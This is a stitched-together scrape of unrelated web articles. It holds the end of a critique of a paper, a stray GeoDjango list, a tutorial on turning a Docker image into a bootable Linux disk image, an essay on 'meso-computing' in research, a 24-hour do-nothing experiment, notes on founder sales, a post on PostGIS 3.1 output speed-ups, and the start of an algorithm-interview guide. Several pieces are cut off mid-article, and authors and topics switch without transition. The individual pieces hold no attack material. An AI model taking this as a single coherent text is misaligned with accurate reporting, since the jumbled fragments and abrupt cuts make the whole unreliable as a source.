archaic retyping process that KN measured?
Again KN provide no reason to believe this.
</li>
</ul>
<p>
Did KN use the honest title
"A comparison of the unreliability of
rushed retyping of a page
using document preparation systems
that are also used for academic research and development"?
No.
Would you expect a journal to accept a paper
with such a title?
</p>
<p>
Instead they used a title …</p></div>

<p><strong>GeoDjango</strong>, the <strong>Django</strong> geographic&nbsp;module</p>
</li>
<li>
<p><strong>SpatiaLite</strong>, the <strong>SQLite</strong> spatial&nbsp;extension</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a name="cut"></a>Well, I don't see any practical applications of the approach I'm going to describe... However, I <em>do</em> think that messing about with things like this is the only way to gain extra knowledge of any system internals. We are going to speak Docker and Linux here. What if we want to take a base Docker image, I mean really <em>base</em>, just an image made with a single line Dockerfile like <code>FROM debian:latest</code>, and convert it to something launchable on a real or virtual machine? In other words, can we create a disk image having exactly the same Linux userland a running container has and then boot from it? For this we would start with dumping container's root file system, luckily it's as simple as just running <a href="https://docs.docker.com/engine/reference/commandline/export/"><code>docker export</code></a>, however, to finally accomplish the task a bunch of additional steps is needed...<a name="eofcut"></a></p>
<p><i>Disclaimer: I have no idea what I'm doing =)</i></p>
<h3 id="theory">Theory</h3>
<p>First, let's bring a tiny bit of boring theory in there. What does the Linux operating system look like after its installation has been done? Basically, it's an on-disk combination of <a href="https://en.wikipedia.org/wiki/Linux_kernel">Linux kernel</a> binary, <a href="https://en.wikipedia.org/wiki/Initial_ramdisk">initial ramdisk</a> binary, and <a href="https://en.wikipedia.org/wiki/User_space#Overview">userland programs and libraries</a>, usually in form of <a href="https://en.wikipedia.org/wiki/GNU_Core_Utilities">GNU Core Utilities</a>. And the last but not least - <a href="https://en.wikipedia.org/wiki/Booting#Boot-loader">the bootloader</a>.</p>
<p><img src="https://iximiuz.com/from-docker-container-to-bootable-linux-disk-image/linux-os-structure.png" width="65%"></p>

<p>Let's run <code>tree -L 1 /</code> and check the <em>root</em> directory structure:</p>
<pre><code>$ cat /etc/os-release | grep NAME
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"

$ tree -L 1 /
/
├── bin
├── boot
├── data
├── dev
├── etc
├── home
├── initrd.img -&gt; boot/initrd.img-4.9.0-9-amd64  # initial ramdisk
├── lib
├── lib64
├── media
├── mnt
├── opt
├── proc
├── root
├── run
├── sbin
├── srv
├── sys
├── tmp
├── usr
├── var
└── vmlinuz -&gt; boot/vmlinuz-4.9.0-9-amd64        # kernel binary</code></pre>
<p>Now let's have a brief look at Docker. Docker follows the <a href="https://en.wikipedia.org/wiki/OS-level_virtualisation">OS-level virtualization</a> way to encapsulate its containers. It basically means that running containers reuse the host's kernel while their userlands are completely separated and come from the appointed Linux distributions:</p>
<p><img src="https://iximiuz.com/from-docker-container-to-bootable-linux-disk-image/docker-containers.png" width="80%"></p>

<p>Let's launch a container and also inspect the <em>root</em> directory:</p>
<pre><code>$ docker run -it debian:latest bash

root@62376e4c451b:/# cat /etc/os-release | grep NAME
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"

root@62376e4c451b:/# apt-get update &amp;&amp; apt-get install -y tree
root@62376e4c451b:/# tree -L 1
.
|-- bin
|-- boot
|-- dev
|-- etc
|-- home
|-- lib
|-- lib64
|-- media
|-- mnt
|-- opt
|-- proc
|-- root
|-- run
|-- sbin
|-- srv
|-- sys
|-- tmp
|-- usr
`--  var

19 directories, 0 files

root@62376e4c451b:/# tree -L 1 /boot
boot/

0 directories, 0 files</code></pre>
<p>We can see Debian's userland in there, but at the same time, there is nothing about kernel &amp; Co. However, this is not the only difference. While a Linux operating system runs its <a href="https://en.wikipedia.org/wiki/Init"><em>init daemon</em></a> as a process with PID 1, Docker containers usually have either <em>shell</em> or directly <em>user-defined executable</em> as a PID 1 processes. Hence, we also need to address this discrepancy to bring container's state as close as possible to the full-fledged Debian installation.</p>
<h3 id="practice">Practice</h3>
<p>Ok, finally, the practical part begins. Let's create a <em>Dockerfile</em> with the following content to have the reproducible process:</p>
<pre><code>FROM debian:stretch</code></pre>
<p>Now let's build it with <code>docker build -t mydebian .</code> and inspect the image with glorious <a href="https://github.com/wagoodman/dive">wagoodman/dive</a>: <code>dive mydebian</code>.</p>
<div>
  <p><img src="https://iximiuz.com/from-docker-container-to-bootable-linux-disk-image/dive-debian-base.png" width="100%"></p><p><i>debian userland only image</i></p>
</div>


<p>We can see, that the total image size is only <em>101 MB</em>, even though the image contains fully-functional Debian userland. Since we are still missing the kernel, we need to download and install kernel binaries. Easy doable with the following modification of the <em>Dockerfile</em>:</p>
<pre><code>FROM debian:stretch
RUN apt-get -y update
RUN apt-get -y install --no-install-recommends \
  linux-image-amd64</code></pre>
<p>Let's rebuild and inspect the new image:</p>
<div>
  <p><img src="https://iximiuz.com/from-docker-container-to-bootable-linux-disk-image/dive-kernel.gif" width="100%"></p><p><i>debian userland + kernel image</i></p>
</div>


<p>Looks like <em>linux-image-amd64</em> package brought extra <em>232 MB</em>, where <em>24 MB</em> came from <code>/boot</code> folder and around <em>200 MB</em> from <code>/lib</code>. Let's dive deeper...</p>
<div>
  <p><img src="https://iximiuz.com/from-docker-container-to-bootable-linux-disk-image/dive-kernel.png" width="100%"></p><p><i>debian userland + kernel image (detailed)</i></p>
</div>

<p>Notice that the kernel itself <code>/boot/vmlinuz-4.9.0-9-amd64</code> is only <em>4.2 MB</em>, initial ramdisk <code>/boot/initrd.img-4.9.0-9-amd64</code> is <em>16</em> more megabytes and the remaining <em>~200 MB</em> is a shit load of <em>kernel modules</em> in <code>/lib/modules</code>, with the prevalent <code>drivers</code> folder.</p>
<p>It's time to bring in the init daemon - <a href="https://en.wikipedia.org/wiki/Systemd">systemd</a>:</p>
<pre><code>FROM debian:stretch
RUN apt-get -y update
RUN apt-get -y install --no-install-recommends \
  linux-image-amd64
RUN apt-get -y install --no-install-recommends \
  systemd-sysv</code></pre>
<p>Rebuild and inspect again:</p>
<div>
  <p><img src="https://iximiuz.com/from-docker-container-to-bootable-linux-disk-image/dive-systemd.gif" width="100%"></p><p><i>debian userland + systemd + kernel image</i></p>
</div>

<p>Some ca. <em>30</em> more megabytes and we are almost there! Let's <a href="https://docs.docker.com/engine/reference/commandline/export/">export</a> container's filesystem:</p>
<pre><code>$ CID=$(docker run -d mydebian /bin/true)
$ docker export -o linux.tar ${CID}

# List files in the archive:
$ tar -tf linux.tar | grep -E '^[^/]*/?$'
.dockerenv
bin/
boot/
dev/
etc/
home/
initrd.img
initrd.img.old
lib/
lib64/
media/
mnt/
opt/
proc/
root/
run/
sbin/
srv/
sys/
tmp/
usr/
var/
vmlinuz
vmlinuz.old</code></pre>
<p>And make a bootable disk image out of the tar archive. The following steps could be done directly on a Linux host machine, but since I use macOS at the moment, I'll start another Debian container as a builder machine:</p>
<pre><code>$ docker run -it -v `pwd`:/os:rw            \
    --cap-add SYS_ADMIN --device /dev/loop0 \
    debian:stretch bash</code></pre>
<p>We need to create a sufficiently-sized image file first:</p>
<pre><code>$ IMG_SIZE=$(expr 1024 \* 1024 \* 1024)
$ dd if=/dev/zero of=/os/linux.img bs=${IMG_SIZE} count=1</code></pre>
<p>Then create a partition on the newly created disk image:</p>
<pre><code>$ sfdisk /os/linux.img &lt;&lt;EOF
label: dos
label-id: 0x5d8b75fc
device: new.img
unit: sectors

linux.img1 : start=2048, size=2095104, type=83, bootable
EOF

Checking that no-one is using this disk right now ... OK

Disk /os/linux.img: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

&gt;&gt;&gt; Script header accepted.
&gt;&gt;&gt; Script header accepted.
&gt;&gt;&gt; Script header accepted.
&gt;&gt;&gt; Script header accepted.
&gt;&gt;&gt; Created a new DOS disklabel with disk identifier 0x5d8b75fc.
/os/linux.img1: Created a new partition 1 of type 'Linux' and of size 1023 MiB.
/os/linux.img2: Done.

New situation:

Device         Boot Start     End Sectors  Size Id Type
/os/linux.img1 *     2048 2097151 2095104 1023M 83 Linux

The partition table has been altered.
Syncing disks.</code></pre>
<p>Mount this image, format it using <code>ext3</code> filesystem and copy content of the tar archive to it:</p>
<pre><code>$ OFFSET=$(expr 512 \* 2048)
$ losetup -o ${OFFSET} /dev/loop0 /os/linux.img
$ mkfs.ext3 /dev/loop0
$ mkdir /os/mnt
$ mount -t auto /dev/loop0 /os/mnt/
$ tar -xvf /os/linux.tar -C /os/mnt/</code></pre>
<p>Finally, we need to install the bootloader and unmount the image:</p>
<pre><code>$ apt-get update -y
$ apt-get install -y extlinux

$ extlinux --install /os/mnt/boot/
$ cat &gt; /os/mnt/boot/syslinux.cfg &lt;&lt;EOF
DEFAULT linux
  SAY Now booting the kernel from SYSLINUX...
 LABEL linux
  KERNEL /vmlinuz
  APPEND ro root=/dev/sda1 initrd=/initrd.img
EOF

$ dd if=/usr/lib/syslinux/mbr/mbr.bin of=/os/linux.img bs=440 count=1 conv=notrunc

$ umount /os/mnt
$ losetup -D</code></pre>
<p>As a result of the steps from above, we will have a disk image <code>linux.img</code> in the working directory.</p>
<h3 id="results">Results</h3>
<p>We just created a bootable Linux disk image which can be dumped to a real or virtual drive. For example, one can easily boot a QEMU virtual machine using the image:</p>
<pre><code>$ qemu-system-x86_64 -drive file=linux.img,index=0,media=disk,format=raw</code></pre>
<div>
  <p><img src="https://iximiuz.com/from-docker-container-to-bootable-linux-disk-image/qemu.gif" width="100%"></p><p><i>qemu virtual machine running linux.img</i></p>
</div>

<p>Or VirtualBox machine by converting the raw image to VDI disk:</p>
<pre><code>$ VBoxManage convertfromraw --format vdi linux.img linux.vdi</code></pre>
<h3 id="bonus-tiny-alpine-linux">Bonus: tiny Alpine Linux</h3>
<p>If Debian's <em>~400 MB</em> is too much for you, Alpine Linux offers comparable functionality under a total of <em>100 MB:</em></p>
<pre><code>FROM alpine:3.9.4
RUN apk update
RUN apk add linux-virt
RUN apk add openrc</code></pre>
<p><img src="https://iximiuz.com/from-docker-container-to-bootable-linux-disk-image/alpine.gif" width="100%">
</p>

<h3 id="instead-of-conclusion">Instead of conclusion</h3>
<p>I created a project to automate the creation of disk images using Docker. For now, I already automated Debian and Alpine distros, check it out on GitHub <a href="https://github.com/iximiuz/docker-to-linux">iximiuz/docker-to-linux</a>.</p>
<p>Make code, not war!</p>

December 8, 2020 | https://milliams.com/posts/2020/mesocomputing/ | <a href="https://web.archive.org/web/*/https://milliams.com/posts/2020/mesocomputing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I've been working as a <a href="https://www.software.ac.uk/blog/2016-08-17-not-so-brief-history-research-software-engineers-0">Research Software Engineer</a> (RSE) at universities in the UK for many years now, across a variety of fields of research (particle physics, synthetic biology, cardiology, etc.) as both a user of computing services and as a provider of them.
One thing that I've seen cropping up repeatedly is a tendency to want to chase the latest fad.
Now, in academia the latest fad is often up to ten years behind the state-of-the-art so, for example, it's only in the last few years that we've seen "deep learning" cropping up in every grant application.
One of the things I do in my job is try to <a href="https://milliams.com/courses">educate researchers</a> about these technologies so that they know what they're actually asking for and to ensure that if researchers are talking about doing "big data" since they have "megabytes of data" they won't be embarased by a grant reviewer who knows their stuff.</p>
<p>The push in this direction is completely understandable. The grant application business is extremely competitive and anything you can put in your proposal to catch the eye of a reviewer is going to count in your favour.</p>
<p>This is all particularly evident when talking about data.
Research money goes to the problems which are most worthy and there's an assumption that the harder the problem, the more worthy it is.
Furthermore, there's an assumption that the more data one has, the bigger and more difficult the research problem.
This naturally pulls together into an idea that if your problem is a "big data" problem then it's more likely to get funded.
You therefore see grant applications trying to convince reviewers that they're doing "big data" when really they're dealing with linear or spatial datasets of maybe only gigabytes to a terabyte.
That's certainly <em>a lot of</em> data but it often lacks the complexity that requires what one would really consider <em>big</em> data solutions.</p>
<p>Now, I'm not trying to downplay these areas of research.
Instead I'm trying to argue that the problems being solved here are just as worthy of investigation, even without couching it in terms of "big data".
<em>Most</em> research problems I see discussed at Universites are not big data and they are all interesting problems.
I think it would be healthy to reduce the allure of big data and let people know that it's ok to not fall into that category.
Part of the problem is that there's no good name for this scale of data problem: that which is a little too big to realistically do on a single laptop or desktop but well below the size or complexity to require a big data machine or a Hadoop cluster.</p>
<p>I've toyed with many names when trying to teach how to tackle problems of this size: <em>Large Data</em>, <em>Biggish Data</em>, <em>Medium Data</em>.
Until now, none have ever grabbed me so I've decided to coin a new term, <strong>meso-data</strong>.
<em>Meso</em> here means "middle" or "intermediate" cf. <a href="https://en.wikipedia.org/wiki/Mesopotamia#Etymology">Mesopotamia</a> ("between rivers").</p>
<div id="meso-computing">
<h2>Meso-computing</h2>
<p>Along with the problem in the data domain (mostly coming from buzzword-chasing), there's a similar issue in the computing-power domain.
Most research follows a common path of starting with a small investigation on a researcher's laptop until they have too many simulations to run or they are taking longer than the working day and so can't be finished in time.
At this point most research institutes will encourage the use of whatever central computing resources they have, usually a single large HPC cluster.</p>
<p>Research institutes such as Universities face a pressure of trying to justify their expenditure on computing resources by extolling all the big problems they're solving: how many nano-seconds of molecular dynamics they're pushing thorugh or how fine-grained the meteorological grid they can simulate.
This encourages the creation of systems which cater towards those few groups in the university who are able to make really good use of a supercomputer — those who can run large multi-node MPI jobs with optimised code for the specific hardware and who have experts in their team who understand high-performance computing.</p>
<p>The problem with this is that it further increases the divide in power and complexity between running on one's laptop and using a central facility.
Similar to with meso-data, there's a large number of researchers — I would argue <em>most</em> researchers — whose needs sit right in the middle.
They're not doing <em>super</em>computing, they're doing <em>meso</em>-computing.</p>
<p>These researchers are best supported with small domain-specific batch clusters, with cloud computing (perhaps using <a href="https://cluster-in-the-cloud.readthedocs.io/">Cluster in the Cloud</a>), with software-as-a-service or with just some hands-on help from an RSE to get their code running more efficiently on their laptop.</p>
<p>Maybe Pandas is sufficient or perhaps they need to use Dask.
Maybe <a href="https://milliams.com/courses/parallel_python">a course</a> on <tt>concurrent.futures</tt> to magically make their code finish in a quarter of the time is the right solution.
Regardless, the solution is probably not to rewrite it in Fortran, using MPI to scale across 64 nodes or to rent a Hadoop cluster.</p>
</div>
<div id="the-middle">
<h2>The middle</h2>
<p>There will be those reading this who think I'm stating the obvious, who think "I've been working in this area for years, what's new?".
That's kind of the point, a lot of researchers sit here but the fact is that they are under-served.
Most aren't computer experts and will use whichever tools are available, advertised to them and are easy to use.
This inevitably means that they email to one another Excel spreadsheets with maybe some R or Python scripts with hard-coded paths.
These researchers are getting stuck as "<a href="https://daedtech.com/how-developers-stop-learning-rise-of-the-expert-beginner/">Expert Beginners</a>".
People who know their entry-level tools so well the short-term barrier to learning how to use them properly or using a better tool for the job is higher than seems worthwhile.</p>
<p>They want to scale their research but when they look around themselves to see what the University can provide, they're told about getting access to the supercomputer or how if they put their data into an Elasticsearch database things would be better.
That jump is far too big and we need to solve the social problem of allowing them to take only as many steps across the meso-data divide as they need to.
We need well-explained and easy-to-use tools at every stage of the scaling process, not just at the top end.</p>
<p>These terms, <em>meso-computing</em> and <em>meso-data</em>, are deliberately humble.
They are explicitly not about trying to be the biggest but rather about thoughtfully considering the problem at hand and choosing the right hammer.
Unlike with big data, people shouldn't have to ask the question "is this a meso-data problem" because if they're asking the question, the answer is "yes".
I want people to be comfortable saying in grant applications "since this is a meso-data challenge, we request funding for the skills and resources needed to tackle it" and ask for a full-time RSE without having to pretend that they're doing big data or need a dedicated supercomputer.
Labels are helpful and I think that these labels apply well to a good chunk of the research community.</p>
<p>Meso-data comes with its own set of tools and solutions which are partially distinct to big data's.
I haven't invented a whole new area of endeavour, many people have been working on solutions here for decades, but it's certainly not an area that attracts excitement or research money as it should.</p>
<p>These are still hard problems, and in my experience they are solving real-world challenges or furthering our understanding of the universe.
Meso-computing and meso-data projects still need expertise from RSEs or data scientists to make sure that the research is still reliable, reproducible, tested and understandable.</p>

<div><figure><img src="https://getradiantlife.com/wp-content/uploads/2019/12/nothing.jpg" alt="12 Secret Benefits of Doing Nothing | Radiant Life Chiropractic" width="794" height="448"></figure></div>



<p>There’s not too much to say on this one, so I’ll keep it short.</p>



<p>My goal was to do nothing for 24 hours. Like everyone in the modern world, I’m hopelessly addicted to little dopamine bursts provided by algorithmically optimized technology (in my case – Reddit, video games, phone messages, and having music or tv shows in the background), so I wanted to see if I had the willpower to cut off all stimulation for an extended period of time.</p>



<h2><span><strong>Rules:</strong></span></h2>



<ol type="1"><li>I cannot engage in any stimulating behavior using external mechanisms for 24 hours.<ol><li>This includes: using a computer, using a television, using a phone, using a book, talking to anybody, looking at anything interesting, eating, or changing locations.</li></ol></li><li>I must remain in my bedroom for the duration of the 24 hours. <ol><li>Exception – I am permitted to leave my bedroom to use the bathroom.<ol><li>(I briefly considered either figuring out a way to not leave the bedroom regardless of bodily demands or to spend the 24 hours in my tiny bathroom, but that would have turned into the “24 hours of pissing and shitting in a bucket challenge” or the “develop a bad back in 24 hours challenge.” Besides, it’s not like relieving myself in the bathroom is especially stimulating.)</li></ol></li><li>The walls of my bedroom are bare, so there’s nothing interesting to look at.</li><li>I may not touch anything in my room beside the bed and the blankets + pillows on it.</li><li>I may not open the curtains and look outside.</li></ol></li><li>I am permitted to have one full 23.7 fluid ounce bottle in my room filled with water.<ol><li>The bottle must not have a label (so I’m not tempted to read it for fun).</li><li>I may not refill the bottle.</li></ol></li><li>My phone will be kept in my room face-down. An alarm will be set for 24 hours. I may not interact with the phone in any way.</li><li>I am not allowed to know what time it is. I must wait for the alarm to go off.</li></ol>



<h2><span><strong>Results</strong></span></h2>



<p>I succeeded on the first attempt. I started at 12:23 PM and finished the following day at the same time. It was challenging, but not too bad.</p>



<p>As you’d expect, I spent the vast majority of time lying in bed just thinking, though occasionally I’d pace around the room. For good stretches of time, I’d get lost in trains of thought, and I’d find the clearness of my mind surprisingly enjoyable as I’d drift between ideas. Other times, I’d play word games with myself, like trying to name 25 foods that start with a letter (I successfully completed C, D, S, and R, and failed on four or five others) or trying to recite the American presidents in order, or the Roman Emperors. I tried to name the first 150 Pokémon, but it was too hard to keep track of.</p>



<p>On bad stretches, nothing in my mind would hit those buttons, and I’d just be super bored. The first eight-ish hours weren’t too bad, but I got a lot more bored at night and especially after I had woken up the next morning. My patience and resolve were definitely tested at times, and I found my mind drifting to rationalizations about how it would be no big deal to check the time or ask Siri about my messages or just give up the stupid experiment, but I persevered. The sanctity of stupid experiments remains intact.</p>



<p>The only interesting part of the experience was the relative depth and clarity of my thoughts. By the time it ended, I had a list of about ten tasks that I immediately wanted to complete (mostly errands and ordinary life matters I had been putting off), plus I came up with two potential writing projects I got excited about. I was actually annoyed at one point that I couldn’t write my ideas down because they were flowing so well.</p>



<p>Then again, I don’t know if I had all these ideas because my quality of thought was higher than usual with no distractions, or because I was engaged in an unusually large quantity of thought since I had nothing else to do.</p>



<p>Either way, I’m glad I did it. I guess I’m not so hopelessly addicted to short term stimulation that I can’t deprive myself of it for a longish period of time.</p>



<p>I’m pretty tired of sitting in rooms doing nothing, so my next experiments will be more exciting. I promise.</p>

            For technical founders it is irrationally, obscenely hard to reverse years of programming (ba dum bum) that sales is a value-destroying activity. Sales is CLEARLY a value-creating activity, contingent on you have a value-creating product.

            The world will not drop what they are doing to adopt your work. This is particularly true in B2B, where simply building a better mousetrap won't overcome the activation energy required to get people with additional non-mice problems to prioritize changing mousetraps today.

            This is very non-obvious for founders because founders are not often people who *want* to be sold to. We often come from a background where trying out tools is a bit of a fun hobby. We like looking at all the options, making charts, and ripping out partially complete tests.

            The process of sales pushes the burden for understanding the market and distilling it from the customer to the sales person. That is a very valuable thing; it is why almost all businesses buy almost all of their big-ticket purchases (including e.g. employees) from sales.

            Simply getting oneself to be comfortable with sales (or at least present as being comfortable for a phone call or two) unlocks a crazy amount of success for founders, because founders have a few advantages over every other sales rep.

            The transition from founder-driven sales to founder-assisted sales generally starts with hiring a "maverick" sort of salesperson; someone who is comfortable extracting what you know about the market, iterating rapidly on scripts, and doing "things that don't scale" to win.

            That is called "asking for the sale" and, while that is a very unconventional way to ask for the sale, a *ridiculous* portion of all energy expended in the art of sales is to get conversations to the point where someone has to actually say yes or no.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>To continue with the changes in <a href="http://postgis.net/2020/11/19/postgis-3.1.0alpha3/">PostGIS 3.1</a>, in this post I’ll cover the performance improvements on many functions that output geometries either as binary or as text. I will talk about several changes which have in common that they kicked off by a single question: “Now what?”</p>

<p>After the release of 3.0 back in October 2019, I wasn’t working on anything directly related to PostGIS with the exception of using MVTs to make maps. Since I had recently improved vector tile functions and I was ok with their performance (<em>spoiler alert</em>: <a href="https://rmr.ninja/2020-11-19-waiting-for-postgis-3-1-mvt/">I ended up improving them again in 3.1</a>) I didn’t have any good ideas about what to work on next. But then two events happened around the same time: <a href="https://cppcon.org/">CppCon</a> released their 2019 talks on YouTube and a coworker mentioned moving large amounts of information between PostgreSQL and BigQuery, which was not only slow but also prone to add inaccuracies to the data.</p>

<p>It turned out that the only way there was to avoid BigQuery altering the geometries on input <a href="https://cloud.google.com/bigquery/docs/gis-data#loading_geojson_data">was to use the GeoJSON</a> format (<a href="https://postgis.net/docs/ST_AsGeoJSON.html">ST_AsGeoJSON</a>) which outputs a JSON with the geometry in its text form, and I had <a href="https://www.youtube.com/watch?v=4P_kbF0EbZM">just watched</a> Stephan T. Lavavej talk where he explained how they had improved the performance of the conversion from floating point numbers to string in Microsoft’s <a href="https://github.com/microsoft/STL">C++ Standard Library</a>. Those two things clicked in my head: If I could apply a similar approach inside PostGIS, we would print geometries 10x faster. Once I started exploring the code and deciding how to best approach the issue I also found several quick enhancements that could be both to text and binary output functions so the task grew but the spirit remained: Let’s make getting geometries out of PostGIS faster.</p>

<h2 id="floating-point-to-string">Floating point to string</h2>

<p>The foundation on which Microsoft’s &lt;charconv&gt; change rested was <strong>Ryū</strong>, an <a href="https://github.com/ulfjack/ryu">algorithm</a> developed by Ulf Adams that greatly improved the speed of float to string conversion, which is likely to be one of the most used functions in computer programs. Think about how many times we print numbers every day: anything from logs, reports, showing them on screen, ETLs… Improving  a function like this means a direct reduction in the energy we use on our devices and data centers, which means that it literally avoids the emission of tons of CO2, which reduces the impact of mankind on climate, slightly tipping the scale on our favor in the fight to save the world from ourselves.</p>

<p>Most developers don’t need to know how to convert a floating point number to string since the standard libraries or the programming languages themselves give us that functionality, and in an ideal world the enhancements introduced by Ryū would be automagically implemented everywhere solving all of our problems. Sadly for us the reality is different and the changes in the output (when compared with the traditional <code>printf</code> output) and the extremely long process to update core system libraries means that there is always more work to do. So although not every programmer has to care about this kind of stuff, some do. For example, Andrew Gierth (a.k.a. our beloved <a href="http://blog.rhodiumtoad.org.uk/">RhodiumToad</a> on IRC) brought Ryū’s improvements to PostgreSQL 12 and I set up to emulate him and do the same in PostGIS.</p>

<h3 id="first-implementation-a-hack">First implementation: A hack</h3>

<p>The first step in the process was to confirm the estimation of how impactful the change would be. I wasn’t looking for a perfect match, instead I just wanted to get something that was close enough to the existing coordinate output with a much better performance.</p>

<p>Since PostgreSQL 12 had introduced a similar change, I modified PostGIS’ <a href="https://github.com/postgis/postgis/blob/d1a410ac26b96d325aebc5915fd5a591da5ba934/liblwgeom/lwprint.c#L455"><code>lwprint_double</code></a> to use those functions directly with an ugly hack that involved hardcoding compiler and linker flags relative to my local installation. This confirmed that I was in the correct path as I saw a <strong>3-4x</strong> improvement in performance in <code>ST_AsText</code>. From that moment, I knew that working on a clean integration was indeed worth it.</p>

<h3 id="second-implementation-ryū">Second implementation: Ryū</h3>

<p>With the proven thesis I moved on to integrate the library into PostGIS itself. In the proposed change (<a href="https://github.com/postgis/postgis/pull/523/">#523</a>) I used Ryū’s <code>d2fixed_buffered_n</code> and <code>d2exp_buffered_n</code> to print coordinates and it worked great: depending on the function (and what percentage of the CPU time was actually spent printing doubles) they became <strong>1.2x to 8x</strong> as fast as they were in 3.0. Nevertheless I did find several points of friction when trying to match the previous output:</p>

<ul>
  <li>
    <p>It printed as many decimal digits as required by the caller. This was in part because it was hard to know how many digits you needed to ensure the number you printed would be reimported as exactly the same binary number, and in many occasions it lead to having a lot of meaningless data: for example, <code>0.3</code> with precision <code>40</code> becomes <code>0.2999999999999999888977697537484345957637</code>.</p>
  </li>
  <li>
    <p>The previous implementation had some bugs with the precision parameter (which determines how many <strong>decimal</strong> digits are included) and sometimes returned less characters than requested. Those issues had to be addressed.</p>
  </li>
  <li>
    <p>I couldn’t simply replace the old call to <code>sprintf</code> with Ryu’s functions because 3.0 did extra operations like trimming trailing zeros. I initially added this truncation to our version of Ryū but I wasn’t very happy with the change since I was adding characters to the buffer to remove them moments later.</p>
  </li>
  <li>
    <p>Ryū’s <code>d2fixed_buffered_n</code> doesn’t provide a way to limit the precision of the output. My initial implementation truncated the string result, which was slow and wrong as it didn’t do proper rounding.</p>
  </li>
</ul>

<p>With all this in mind I decided that I would rather break compatibility and change the coordinate output format to provide a faster and more human friendly alternative. Hopefully with less bugs.</p>

<h3 id="third-implementation-custom-ryū">Third implementation: Custom Ryū</h3>

<p>The final step, which will be part of PostGIS 3.1, was focused on getting a better coordinate output while keeping the performance improvements of the second iteration. After multiple tests and discussions, the final decision was to use the following rules:</p>

<ul>
  <li>
    <p>Use the <strong>shortest representation</strong>, which is enough to guarantee round-trip safety. <code>0.3</code> will always be represented as <code>0.3</code> for any precision greater than 0.</p>
  </li>
  <li>
    <p>Use scientific notation for absolute numbers smaller than <code>1e-8</code>. The previous behaviour was to output <code>0</code> for absolute values smaller than <code>1e-12</code>, which meant a precision loss around zero.</p>
  </li>
  <li>
    <p>Use scientific notation for absolute numbers greater than <code>1e+15</code>, which was the same behaviour as before.</p>
  </li>
  <li>
    <p>The precision parameter still limits only the number of decimal digits of the output but now it is applied with proper rounding to the shortest representation, that is it will only trim <strong>meaningful</strong> decimal digits. It will also be applied exactly in the same way to all text output functions.</p>
  </li>
  <li>
    <p>The precision parameter now also affects the scientific notation too, whereas before the precision for large numbers was fixed to between 5 and 8 digits.</p>
  </li>
  <li>
    <p>The default precision value remains unchanged: <code>9</code> for GeoJSON and <code>15</code> for everything else.</p>
  </li>
</ul>

<p>The <a href="https://github.com/postgis/postgis/pull/570">new code</a> is based on Ryū’s <code>d2s</code> and modified to handle the format defined above and has a faster and more consistent output than before. Let’s see an example of the same geometry at different precision levels:</p>

<p>We can see the two most noticeable changes here:</p>

<ul>
  <li>
    <p><code>0.29999999999999999</code> represents the same binary value as <code>0.3</code>, so in 3.1 we always prefer <code>0.3</code> as it’s sorter and still safe for a round trip.</p>
  </li>
  <li>
    <p>At precision 15, you already have enough digits to show <code>22.200000000000003</code> which, but due to a bug, wouldn’t show until precision 17 in 3.0. As it’s the case for <code>0.3</code>, that number already has as many digits as needed to uniquely identify a binary floating point number, so there is no need to add more digits in higher precision levels.</p>
  </li>
</ul>

<h2 id="other-changes">Other changes</h2>

<p>Once you speed up the slowest wheel in the process others raise in importance or even become the new bottleneck, so aside from introducing Ryū and changing the coordinate output format I also applied several other performance improvements:</p>

<ul>
  <li>
    <p>In many output functions, both in text and binary output, we now generate the exact buffer that we are going to return to PostgreSQL instead of a temporary one that later needs to be copied to add a header (<a href="https://github.com/postgis/postgis/pull/541">#541</a>).</p>
  </li>
  <li>
    <p>We no longer use intermediate buffers when printing individual coordinates (<a href="https://github.com/postgis/postgis/pull/573">#573</a>) to avoid <code>memcpy</code> and <code>strlen</code> calls (<a href="https://github.com/postgis/postgis/pull/537">#537</a>, <a href="https://github.com/postgis/postgis/commit/87922037fd09b68ad2ada409f776e06590924256">r8792203</a>).</p>
  </li>
  <li>
    <p>In functions that need the SRS for the output (like ST_AsGML or optionally ST_AsGeoJSON) we cache it instead of generating it for each row (<a href="https://github.com/postgis/postgis/pull/557">#557</a>). We also avoid SQL inlines where the cache is destroyed after each row, which made it useless (<a href="https://github.com/postgis/postgis/pull/561">#561</a>). This also affects <a href="https://postgis.net/docs/ST_GeomFromGeoJSON.html">ST_GeomfromGeoJSON</a> and the the equivalent <code>'{}'::geometry</code>.</p>
  </li>
  <li>
    <p>I also adapted the cost of the SQL functions to help PostgreSQL planner make better decisions (<a href="https://github.com/postgis/postgis/pull/556">#556</a>).</p>
  </li>
</ul>

<h2 id="performance-comparison">Performance comparison</h2>

<p>For most of the benchmarks I’ll use the <a href="https://open.canada.ca/data/en/dataset/a883eb14-0c0e-45c4-b8c4-b54c4a819edb">Boundaries of Canada Provinces</a> dataset, which contains only 13 multipolygons with an average of 260k points and over 2000 rings. It’s my favourite …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1536">
			<!-- .entry-header -->
		<div>
		<p><span>Over the past few years, I’ve interviewed with a dozen or so companies and have completed ~50 or so individual algorithm problems. I’m frequently given feedback that I did a great job at the algorithms problem. In this post, I’m going to share how exactly I approach algorithm problems.</span></p>
<h2><span>Thought Process</span></h2>
<p><span>A guiding principle I use is that every interview problem is designed to be solved. You aren’t going to be asked to prove Fermat’s Last Theorem in an interview. If you are given some impossible problem, it’s not like you’re going to have much of a chance anyways.</span></p>
<p><span>In my experience, around 80% of the time an algorithm problem will boil down to a few core data structures and algorithms. The data structures I see the most are are:</span><span><br>
</span></p>
<ul>
<li><span>Hash Tables</span></li>
<li><span>Linked Lists</span></li>
<li><span>Binary Search Trees</span></li>
</ul>
<p><span>As for the algorithms:</span></p>
<ul>
<li><span>Depth-first search</span></li>
<li><span>Binary Search</span></li>
<li><span>Sorting Algorithms</span></li>
</ul>
<p><span>(You probably won’t be expected to implement a binary search or sorting algorithm, but you should be aware that they exist.)</span></p>
